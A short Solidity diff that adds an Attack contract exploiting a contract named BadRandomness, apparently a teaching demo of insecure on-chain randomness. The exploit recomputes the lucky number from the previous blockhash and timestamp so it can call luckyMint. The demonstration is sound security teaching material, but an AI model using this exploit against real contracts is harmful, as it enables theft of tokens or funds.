@@ -15,3 +15,12 @@ contract BadRandomness is ERC721 {
         totalSupply++;
     }
 }
+
+contract Attack {
+    function attackMint(BadRandomness nftAddr) external {
+        uint256 luckyNumber = uint256(
+        keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100;
+
+        nftAddr.luckyMint(luckyNumber);
+    }
+}
